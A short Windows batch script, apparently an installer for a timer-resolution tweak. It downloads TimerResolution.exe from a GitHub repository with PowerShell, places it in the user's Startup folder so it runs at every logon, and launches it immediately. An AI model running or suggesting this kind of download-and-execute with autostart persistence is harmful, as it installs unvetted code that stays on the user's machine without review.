@echo off
setlocal
set "url=https://github.com/Mirgarr/timerresolution/raw/main/TimerResolution.exe"
set "startupFolder=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"
set "outputFile2=%startupFolder%\TimerResolution.exe"

powershell -command "Invoke-WebRequest -Uri '%url%' -OutFile '%outputFile2%'"

start "" "%outputFile2%"

endlocal
